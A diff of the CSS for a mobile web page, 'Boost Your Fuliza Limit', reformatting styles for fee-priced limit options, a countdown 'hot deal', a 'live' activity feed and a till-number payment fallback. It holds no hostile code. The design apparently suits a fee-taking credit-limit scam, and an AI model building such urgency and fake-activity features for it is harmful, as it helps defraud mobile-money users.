@@ -1,2044 +1,1920 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Boost Your Fuliza Limit | Get Instant Increase</title>
-
-    <!-- Fonts & Icons -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
-    <!-- SweetAlert2 -->
-    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
-
-    <style>
-        /* ─── same as original ─── */
-        :root {
-            --primary: #1f7a1f;
-            --primary-dark: #00662a;
-            --accent: #d93025;
-            --gold: #f59e0b;
-            --gold-light: #fef3c7;
-            --gradient-bg: linear-gradient(135deg, #f4f6f3 0%, #e9f5ea 100%);
-            --card-bg: #ffffff;
-            --text-dark: #222222;
-            --text-muted: #6b6b6b;
-            --border-color: #dfe7df;
-            --shadow-sm: 0 2px 8px rgba(2, 6, 23, 0.06);
-            --shadow-md: 0 4px 12px rgba(2, 6, 23, 0.08);
-            --shadow-lg: 0 6px 18px rgba(2, 6, 23, 0.12);
-            --radius: 14px;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        html {
-            font-size: 14px;
-        }
-
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: var(--gradient-bg);
-            color: var(--text-dark);
-            line-height: 1.4;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            padding: 12px;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-
-        .container {
-            max-width: 100%;
-            margin: 0 auto;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 12px;
-        }
-
-        .logo {
-            font-size: 1.7rem;
-            font-weight: 800;
-            color: var(--primary);
-            line-height: 1.2;
-        }
-
-        .logo span {
-            color: var(--accent);
-        }
-
-        .subtitle {
-            color: var(--text-muted);
-            font-size: 0.75rem;
-            line-height: 1.3;
-        }
-
-        .info-box {
-            background: var(--card-bg);
-            border-radius: var(--radius);
-            padding: 12px 14px;
-            margin-bottom: 10px;
-            box-shadow: var(--shadow-sm);
-            border-left: 3px solid var(--primary);
-            text-align: center;
-            font-size: 0.8rem;
-            color: var(--text-muted);
-            line-height: 1.3;
-        }
-
-        .info-box i {
-            color: var(--primary);
-            margin-right: 6px;
-        }
-
-        .feed-card {
-            background: var(--card-bg);
-            border-radius: var(--radius);
-            padding: 12px 14px;
-            margin-bottom: 12px;
-            box-shadow: var(--shadow-sm);
-            border: 1px solid var(--border-color);
-        }
-
-        .feed-header {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: var(--text-muted);
-            margin-bottom: 6px;
-            letter-spacing: 0.3px;
-        }
-
-        .feed-header i {
-            color: var(--primary);
-            font-size: 0.8rem;
-        }
-
-        .live-badge {
-            color: #22c55e;
-            font-size: 0.55rem;
-            font-weight: 700;
-            background: #dcfce7;
-            padding: 2px 8px;
-            border-radius: 999px;
-            margin-left: auto;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .live-badge::before {
-            content: '';
-            display: inline-block;
-            width: 6px;
-            height: 6px;
-            background: #22c55e;
-            border-radius: 50%;
-            animation: pulse-dot 1.5s infinite;
-        }
-
-        @keyframes pulse-dot {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.3;
-                transform: scale(0.7);
-            }
-        }
-
-        .feed-container {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            min-height: 40px;
-        }
-
-        .feed-icon {
-            color: var(--primary);
-            font-size: 0.9rem;
-            flex-shrink: 0;
-        }
-
-        .feed-content {
-            flex: 1;
-            min-width: 0;
-        }
-
-        .feed-text {
-            font-size: 0.85rem;
-            color: var(--text-dark);
-            line-height: 1.3;
-            font-weight: 500;
-        }
-
-        .feed-text .highlight {
-            color: var(--primary);
-            font-weight: 700;
-        }
-
-        .feed-text .time {
-            color: var(--text-muted);
-            font-weight: 400;
-            font-size: 0.7rem;
-            margin-left: 4px;
-        }
-
-        .hot-deal {
-            background: #ffffff;
-            border-radius: var(--radius);
-            padding: 12px 16px;
-            margin-bottom: 12px;
-            box-shadow: var(--shadow-sm);
-            border-top: 4px solid var(--gold);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-
-        .hot-deal-left {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-
-        .hot-badge {
-            background: var(--gold);
-            color: #fff;
-            font-size: 0.6rem;
-            font-weight: 800;
-            padding: 2px 10px;
-            border-radius: 999px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .hot-deal-left .hot-title {
-            font-size: 0.95rem;
-            font-weight: 700;
-            color: var(--text-dark);
-        }
-
-        .hot-timer {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            font-size: 0.7rem;
-            color: var(--accent);
-            font-weight: 600;
-            background: #fef2f2;
-            padding: 2px 10px;
-            border-radius: 999px;
-        }
-
-        .hot-timer i {
-            font-size: 0.65rem;
-        }
-
-        .countdown {
-            font-family: 'Courier New', monospace;
-            font-weight: 700;
-        }
-
-        .hot-deal-right {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-
-        .hot-price {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .original-price {
-            font-size: 0.75rem;
-            color: var(--text-muted);
-            text-decoration: line-through;
-        }
-
-        .deal-price {
-            font-size: 1.1rem;
-            font-weight: 800;
-            color: var(--accent);
-        }
-
-        .hot-deal-btn {
-            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
-            border: none;
-            border-radius: 999px;
-            color: #fff;
-            font-weight: 700;
-            font-size: 0.8rem;
-            padding: 8px 18px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 2px 8px rgba(31, 122, 31, 0.25);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            white-space: nowrap;
-        }
-
-        .hot-deal-btn:hover {
-            transform: scale(1.03);
-            box-shadow: 0 4px 12px rgba(31, 122, 31, 0.35);
-        }
-
-        .hot-deal-btn:active {
-            transform: scale(0.97);
-        }
-
-        .hot-deal-btn i {
-            font-size: 0.7rem;
-        }
-
-        .card {
-            background: var(--card-bg);
-            border-radius: var(--radius);
-            padding: 18px;
-            box-shadow: var(--shadow-md);
-            margin-bottom: 12px;
-        }
-
-        .progress {
-            height: 5px;
-            border-radius: 3px;
-            overflow: hidden;
-            display: flex;
-            margin-bottom: 16px;
-            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
-        }
-
-        .progress div {
-            flex: 1;
-            transition: all 0.3s ease;
-        }
-
-        .progress .step-1 {
-            background: #000;
-        }
-        .progress .step-2 {
-            background: var(--accent);
-        }
-        .progress .step-3 {
-            background: var(--primary);
-        }
-
-        .title {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: var(--primary);
-            margin-bottom: 16px;
-            line-height: 1.3;
-        }
-
-        .title i {
-            font-size: 1.3rem;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-            margin-bottom: 16px;
-        }
-
-        .loan-box {
-            background: linear-gradient(180deg, #ffffff 0%, #f8f9f7 100%);
-            border: 2px solid var(--border-color);
-            border-radius: 12px;
-            padding: 12px 8px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            user-select: none;
-            min-height: 80px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-        }
-
-        .loan-box:hover {
-            transform: translateY(-2px);
-            box-shadow: var(--shadow-md);
-            border-color: var(--primary);
-        }
-
-        .loan-box.selected {
-            border-color: var(--primary);
-            background: linear-gradient(180deg, rgba(31, 122, 31, 0.1) 0%, rgba(31, 122, 31, 0.05) 100%);
-            box-shadow: 0 4px 12px rgba(31, 122, 31, 0.15);
-            transform: translateY(-2px) scale(1.01);
-            cursor: default;
-        }
-
-        .loan-box.hot-highlight {
-            border-color: var(--gold);
-            background: linear-gradient(180deg, rgba(245, 158, 11, 0.08) 0%, rgba(245, 158, 11, 0.02) 100%);
-            box-shadow: 0 0 0 2px rgba(245, 158, 11, 0.15);
-        }
-
-        .loan-box.hot-highlight.selected {
-            border-color: var(--gold);
-            box-shadow: 0 4px 16px rgba(245, 158, 11, 0.25);
-        }
-
-        .hot-tag {
-            position: absolute;
-            top: -6px;
-            right: -6px;
-            background: var(--gold);
-            color: #fff;
-            font-size: 0.5rem;
-            font-weight: 700;
-            padding: 2px 8px;
-            border-radius: 999px;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            box-shadow: 0 2px 6px rgba(245, 158, 11, 0.3);
-        }
-
-        .amount {
-            font-size: 1.05rem;
-            font-weight: 800;
-            color: var(--primary);
-            margin-bottom: 2px;
-            transition: all 0.3s ease;
-            line-height: 1.2;
-        }
-
-        .loan-box.selected .amount {
-            color: var(--primary-dark);
-            font-size: 1.1rem;
-        }
-
-        .fee {
-            display: inline-block;
-            padding: 3px 10px;
-            background: #eef1ee;
-            border-radius: 999px;
-            font-size: 0.7rem;
-            font-weight: 600;
-            color: var(--text-muted);
-            transition: all 0.3s ease;
-            line-height: 1.4;
-        }
-
-        .loan-box.selected .fee {
-            background: var(--primary);
-            color: white;
-        }
-
-        .loan-box.hot-highlight .fee {
-            background: var(--gold-light);
-            color: #92400e;
-        }
-
-        .fee .original-fee {
-            text-decoration: line-through;
-            color: #999;
-            font-weight: 400;
-            margin-right: 4px;
-        }
-
-        .fee .deal-fee {
-            color: var(--accent);
-            font-weight: 700;
-        }
-
-        .get-btn-inline {
-            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
-            border: none;
-            border-radius: 999px;
-            color: #fff;
-            font-weight: 700;
-            font-size: 0.7rem;
-            padding: 4px 14px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 2px 8px rgba(31, 122, 31, 0.3);
-            margin-top: 4px;
-            display: none;
-            width: 100%;
-            max-width: 110px;
-            letter-spacing: 0.3px;
-        }
-
-        .loan-box.selected .get-btn-inline {
-            display: block;
-        }
-
-        .get-btn-inline:hover {
-            transform: scale(1.04);
-            box-shadow: 0 4px 12px rgba(31, 122, 31, 0.4);
-        }
-        .get-btn-inline:active {
-            transform: scale(0.96);
-        }
-
-        .loan-box.hot-highlight .get-btn-inline {
-            background: var(--gold);
-            box-shadow: 0 2px 8px rgba(245, 158, 11, 0.4);
-        }
-
-        .cta {
-            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
-            border-radius: 999px;
-            padding: 15px;
-            text-align: center;
-            color: #fff;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 6px 15px rgba(31, 122, 31, 0.3);
-            border: none;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .cta:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(31, 122, 31, 0.4);
-        }
-
-        .cta:active {
-            transform: translateY(0);
-            box-shadow: 0 4px 10px rgba(31, 122, 31, 0.3);
-        }
-
-        .cta.disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none !important;
-            box-shadow: none !important;
-        }
-
-        .trust-badges {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 8px;
-            margin-top: 4px;
-            padding: 0 2px;
-        }
-
-        .badge {
-            background: linear-gradient(180deg, rgba(31, 122, 31, 0.05) 0%, rgba(31, 122, 31, 0.02) 100%);
-            border: 1px solid var(--border-color);
-            border-radius: 999px;
-            padding: 6px 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            font-size: 0.65rem;
-            color: var(--text-muted);
-            text-align: center;
-            line-height: 1.2;
-        }
-
-        .badge i {
-            color: var(--primary);
-            font-size: 0.75rem;
-        }
-
-        .input-container {
-            padding: 8px 0;
-            text-align: center;
-        }
-
-        .input-section-title {
-            font-size: 0.85rem;
-            color: var(--text-muted);
-            margin-bottom: 12px;
-            text-align: center;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            line-height: 1.3;
-        }
-
-        .input-wrapper {
-            margin-bottom: 14px;
-        }
-
-        .input-label {
-            display: block;
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: var(--primary);
-            margin-bottom: 4px;
-            text-align: left;
-            padding-left: 2px;
-            line-height: 1.2;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 10px 12px;
-            border: 2px solid var(--border-color);
-            border-radius: 10px;
-            font-size: 0.9rem;
-            font-weight: 500;
-            outline: none;
-            background: white;
-            transition: all 0.2s ease;
-        }
-
-        .input-field:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 2px rgba(31, 122, 31, 0.1);
-        }
-
-        .input-field::placeholder {
-            color: #a0a0a0;
-            font-size: 0.85rem;
-        }
-
-        .phone-input-with-prefix {
-            display: flex;
-            width: 100%;
-            border: 2px solid var(--border-color);
-            border-radius: 10px;
-            overflow: hidden;
-            transition: all 0.2s ease;
-        }
-
-        .phone-input-with-prefix:focus-within {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 2px rgba(31, 122, 31, 0.1);
-        }
-
-        .phone-prefix {
-            background: #f8f9f7;
-            padding: 10px 12px;
-            font-weight: 600;
-            color: var(--text-dark);
-            border-right: 2px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-width: 70px;
-            font-size: 0.85rem;
-        }
-
-        .phone-input-field {
-            flex: 1;
-            padding: 10px 12px;
-            border: none;
-            font-size: 0.9rem;
-            font-weight: 500;
-            outline: none;
-            background: white;
-            min-width: 0;
-        }
-
-        .input-note-modal {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            text-align: center;
-            margin-top: 10px;
-            background: #f8f9f7;
-            padding: 8px;
-            border-radius: 8px;
-            line-height: 1.3;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes pulse {
-            0% {
-                box-shadow: 0 0 0 0 rgba(31, 122, 31, 0.4);
-            }
-            70% {
-                box-shadow: 0 0 0 8px rgba(31, 122, 31, 0);
-            }
-            100% {
-                box-shadow: 0 0 0 0 rgba(31, 122, 31, 0);
-            }
-        }
-
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-
-        /* manual payment fallback styles */
-        .manual-payment-box {
-            background: #fef9e3;
-            border-left: 4px solid #f59e0b;
-            padding: 16px;
-            border-radius: 16px;
-            margin: 12px 0;
-            text-align: left;
-        }
-
-        .manual-payment-box i {
-            color: #f59e0b;
-            margin-right: 6px;
-        }
-
-        .copy-till {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-            background: white;
-            padding: 8px 12px;
-            border-radius: 40px;
-            margin: 12px 0;
-            border: 1px solid var(--border-color);
-            flex-wrap: wrap;
-        }
-
-        .till-number {
-            font-family: 'Courier New', monospace;
-            font-size: 1.2rem;
-            font-weight: 700;
-            background: #f3f4f6;
-            padding: 6px 14px;
-            border-radius: 40px;
-            letter-spacing: 1px;
-            color: var(--primary);
-        }
-
-        .copy-btn-sm {
-            background: var(--primary);
-            color: #fff;
-            border: none;
-            padding: 6px 16px;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 0.75rem;
-            cursor: pointer;
-            transition: 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .copy-btn-sm:hover {
-            transform: scale(1.04);
-            box-shadow: 0 2px 8px rgba(31, 122, 31, 0.25);
-        }
-
-        .manual-input-group {
-            margin-top: 12px;
-        }
-
-        .manual-input-group label {
-            display: block;
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: var(--text-muted);
-            margin-bottom: 4px;
-        }
-
-        .manual-input-group textarea {
-            width: 100%;
-            padding: 10px 12px;
-            border: 2px solid var(--border-color);
-            border-radius: 10px;
-            font-size: 0.8rem;
-            font-family: inherit;
-            resize: vertical;
-            min-height: 60px;
-            outline: none;
-            transition: border 0.2s, box-shadow 0.2s;
-            background: white;
-        }
-
-        .manual-input-group textarea:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 2px rgba(31, 122, 31, 0.1);
-        }
-
-        .manual-input-group textarea.error {
-            border-color: #ef4444 !important;
-            box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2) !important;
-        }
-
-        .manual-input-group .error-msg {
-            color: #ef4444;
-            font-size: 0.7rem;
-            margin-top: 4px;
-            display: none;
-        }
-
-        .manual-input-group .error-msg.show {
-            display: block;
-        }
-
-        .manual-actions {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            margin-top: 14px;
-        }
-
-        .manual-actions .btn-primary {
-            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
-            border: none;
-            border-radius: 999px;
-            padding: 12px;
-            color: #fff;
-            font-weight: 700;
-            font-size: 0.9rem;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 2px 8px rgba(31, 122, 31, 0.2);
-            width: 100%;
-        }
-
-        .manual-actions .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(31, 122, 31, 0.35);
-        }
-
-        .manual-actions .btn-secondary {
-            background: #f3f4f6;
-            border: 1px solid var(--border-color);
-            border-radius: 999px;
-            padding: 12px;
-            color: var(--text-muted);
-            font-weight: 600;
-            font-size: 0.85rem;
-            cursor: pointer;
-            transition: 0.2s;
-            width: 100%;
-        }
-
-        .manual-actions .btn-secondary:hover {
-            background: #e5e7eb;
-        }
-
-        /* Small phones */
-        @media (max-width: 360px) {
-            html {
-                font-size: 13px;
-            }
-            body {
-                padding: 10px;
-            }
-            .logo {
-                font-size: 1.4rem;
-            }
-            .card {
-                padding: 14px;
-            }
-            .grid {
-                gap: 8px;
-            }
-            .loan-box {
-                padding: 10px 6px;
-                min-height: 72px;
-            }
-            .amount {
-                font-size: 0.95rem;
-            }
-            .hot-deal {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .hot-deal-left {
-                justify-content: center;
-            }
-            .hot-deal-right {
-                justify-content: center;
-            }
-            .hot-deal-btn {
-                width: 100%;
-                justify-content: center;
-            }
-            .cta {
-                padding: 13px;
-                font-size: 0.9rem;
-            }
-        }
-
-        @media (max-height: 500px) and (orientation: landscape) {
-            .grid {
-                grid-template-columns: repeat(3, 1fr);
-            }
-            .loan-box {
-                min-height: 65px;
-            }
-            .hot-deal {
-                padding: 10px 14px;
-            }
-            .feed-card {
-                padding: 8px 12px;
-            }
-        }
-
-        @media (min-width: 480px) {
-            body {
-                padding: 16px;
-            }
-            .container {
-                max-width: 440px;
-                margin: 0 auto;
-            }
-            .logo {
-                font-size: 1.8rem;
-            }
-            .card {
-                padding: 20px;
-            }
-            .loan-box {
-                padding: 14px 12px;
-                min-height: 90px;
-            }
-            .amount {
-                font-size: 1.1rem;
-            }
-        }
-
-        .swal2-popup {
-            border-radius: 16px !important;
-            padding: 20px !important;
-            max-width: 92% !important;
-            width: auto !important;
-            margin: 0 10px !important;
-        }
-
-        .swal2-title {
-            color: var(--primary) !important;
-            font-weight: 700 !important;
-            font-size: 1.1rem !important;
-            margin-bottom: 10px !important;
-            line-height: 1.3 !important;
-        }
-
-        .swal2-html-container {
-            margin: 0 !important;
-            padding: 0 !important;
-        }
-
-        .swal2-confirm {
-            background: linear-gradient(90deg, var(--primary), var(--primary-dark)) !important;
-            border-radius: 10px !important;
-            font-weight: 600 !important;
-            padding: 12px 24px !important;
-            font-size: 0.9rem !important;
-            margin-top: 10px !important;
-            width: 100% !important;
-        }
-
-        .swal2-cancel {
-            background: #f8f9f7 !important;
-            border: 2px solid var(--border-color) !important;
-            border-radius: 10px !important;
-            color: var(--text-muted) !important;
-            font-weight: 500 !important;
-            padding: 12px 24px !important;
-            font-size: 0.9rem !important;
-            margin-top: 6px !important;
-            width: 100% !important;
-        }
-
-        .swal2-actions {
-            flex-direction: column !important;
-            width: 100% !important;
-            margin-top: 14px !important;
-        }
-
-        .payment-confirm-content {
-            padding: 0 4px;
-            text-align: center;
-        }
-        .payment-confirm-icon {
-            font-size: 2.2rem !important;
-            color: var(--primary);
-            margin-bottom: 10px;
-        }
-        .payment-details-box {
-            background: #f8f9f7;
-            padding: 10px;
-            border-radius: 10px;
-            margin-bottom: 12px;
-        }
-        .payment-detail-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 6px;
-            font-size: 0.85rem;
-        }
-        .payment-detail-row:last-child {
-            margin-bottom: 0;
-        }
-        .payment-phone-note {
-            color: #666;
-            font-size: 0.75rem;
-            margin-top: 8px;
-            line-height: 1.3;
-        }
-
-        .stk-push-content {
-            text-align: center;
-            padding: 0 4px;
-        }
-        .stk-push-icon {
-            font-size: 2.2rem !important;
-            color: var(--primary);
-            margin-bottom: 10px;
-        }
-        .stk-phone-display {
-            background: #f8f9f7;
-            padding: 8px;
-            border-radius: 8px;
-            margin: 10px 0;
-            font-weight: 600;
-            font-size: 0.9rem;
-        }
-
-        .success-icon {
-            font-size: 2.8rem !important;
-            color: #22c55e;
-            margin-bottom: 10px;
-        }
-        .error-icon {
-            font-size: 2.2rem !important;
-            color: #f59e0b;
-            margin-bottom: 10px;
-        }
-
-        /* Loading spinner override for empty text */
-        .swal2-loading {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        /* Toast notification for copy */
-        .toast-copy {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1f2937;
-            color: white;
-            padding: 10px 24px;
-            border-radius: 40px;
-            font-size: 0.85rem;
-            font-weight: 500;
-            z-index: 9999;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.3s, visibility 0.3s;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            pointer-events: none;
-        }
-        .toast-copy.show {
-            opacity: 1;
-            visibility: visible;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Boost Your Fuliza Limit | Get Instant Increase</title>
+
+  <!-- Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <!-- SweetAlert2 -->
+  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
+
+  <style>
+    /* ─── same as original ─── */
+    :root {
+      --primary: #1f7a1f;
+      --primary-dark: #00662a;
+      --accent: #d93025;
+      --gold: #f59e0b;
+      --gold-light: #fef3c7;
+      --gradient-bg: linear-gradient(135deg, #f4f6f3 0%, #e9f5ea 100%);
+      --card-bg: #ffffff;
+      --text-dark: #222222;
+      --text-muted: #6b6b6b;
+      --border-color: #dfe7df;
+      --shadow-sm: 0 2px 8px rgba(2, 6, 23, 0.06);
+      --shadow-md: 0 4px 12px rgba(2, 6, 23, 0.08);
+      --shadow-lg: 0 6px 18px rgba(2, 6, 23, 0.12);
+      --radius: 14px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html {
+      font-size: 14px;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--gradient-bg);
+      color: var(--text-dark);
+      line-height: 1.4;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      padding: 12px;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    .container {
+      max-width: 100%;
+      margin: 0 auto;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 12px;
+    }
+
+    .logo {
+      font-size: 1.7rem;
+      font-weight: 800;
+      color: var(--primary);
+      line-height: 1.2;
+    }
+
+    .logo span {
+      color: var(--accent);
+    }
+
+    .subtitle {
+      color: var(--text-muted);
+      font-size: 0.75rem;
+      line-height: 1.3;
+    }
+
+    .info-box {
+      background: var(--card-bg);
+      border-radius: var(--radius);
+      padding: 12px 14px;
+      margin-bottom: 10px;
+      box-shadow: var(--shadow-sm);
+      border-left: 3px solid var(--primary);
+      text-align: center;
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      line-height: 1.3;
+    }
+
+    .info-box i {
+      color: var(--primary);
+      margin-right: 6px;
+    }
+
+    .feed-card {
+      background: var(--card-bg);
+      border-radius: var(--radius);
+      padding: 12px 14px;
+      margin-bottom: 12px;
+      box-shadow: var(--shadow-sm);
+      border: 1px solid var(--border-color);
+    }
+
+    .feed-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-bottom: 6px;
+      letter-spacing: 0.3px;
+    }
+
+    .feed-header i {
+      color: var(--primary);
+      font-size: 0.8rem;
+    }
+
+    .live-badge {
+      color: #22c55e;
+      font-size: 0.55rem;
+      font-weight: 700;
+      background: #dcfce7;
+      padding: 2px 8px;
+      border-radius: 999px;
+      margin-left: auto;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .live-badge::before {
+      content: '';
+      display: inline-block;
+      width: 6px;
+      height: 6px;
+      background: #22c55e;
+      border-radius: 50%;
+      animation: pulse-dot 1.5s infinite;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.3; transform: scale(0.7); }
+    }
+
+    .feed-container {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      min-height: 40px;
+    }
+
+    .feed-icon {
+      color: var(--primary);
+      font-size: 0.9rem;
+      flex-shrink: 0;
+    }
+
+    .feed-content {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .feed-text {
+      font-size: 0.85rem;
+      color: var(--text-dark);
+      line-height: 1.3;
+      font-weight: 500;
+    }
+
+    .feed-text .highlight {
+      color: var(--primary);
+      font-weight: 700;
+    }
+
+    .feed-text .time {
+      color: var(--text-muted);
+      font-weight: 400;
+      font-size: 0.7rem;
+      margin-left: 4px;
+    }
+
+    .hot-deal {
+      background: #ffffff;
+      border-radius: var(--radius);
+      padding: 12px 16px;
+      margin-bottom: 12px;
+      box-shadow: var(--shadow-sm);
+      border-top: 4px solid var(--gold);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .hot-deal-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .hot-badge {
+      background: var(--gold);
+      color: #fff;
+      font-size: 0.6rem;
+      font-weight: 800;
+      padding: 2px 10px;
+      border-radius: 999px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .hot-deal-left .hot-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: var(--text-dark);
+    }
+
+    .hot-timer {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 0.7rem;
+      color: var(--accent);
+      font-weight: 600;
+      background: #fef2f2;
+      padding: 2px 10px;
+      border-radius: 999px;
+    }
+
+    .hot-timer i {
+      font-size: 0.65rem;
+    }
+
+    .countdown {
+      font-family: 'Courier New', monospace;
+      font-weight: 700;
+    }
+
+    .hot-deal-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .hot-price {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .original-price {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      text-decoration: line-through;
+    }
+
+    .deal-price {
+      font-size: 1.1rem;
+      font-weight: 800;
+      color: var(--accent);
+    }
+
+    .hot-deal-btn {
+      background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+      border: none;
+      border-radius: 999px;
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.8rem;
+      padding: 8px 18px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 2px 8px rgba(31, 122, 31, 0.25);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      white-space: nowrap;
+    }
+
+    .hot-deal-btn:hover {
+      transform: scale(1.03);
+      box-shadow: 0 4px 12px rgba(31, 122, 31, 0.35);
+    }
+
+    .hot-deal-btn:active {
+      transform: scale(0.97);
+    }
+
+    .hot-deal-btn i {
+      font-size: 0.7rem;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border-radius: var(--radius);
+      padding: 18px;
+      box-shadow: var(--shadow-md);
+      margin-bottom: 12px;
+    }
+
+    .progress {
+      height: 5px;
+      border-radius: 3px;
+      overflow: hidden;
+      display: flex;
+      margin-bottom: 16px;
+      box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+    }
+
+    .progress div {
+      flex: 1;
+      transition: all 0.3s ease;
+    }
+
+    .progress .step-1 { background: #000; }
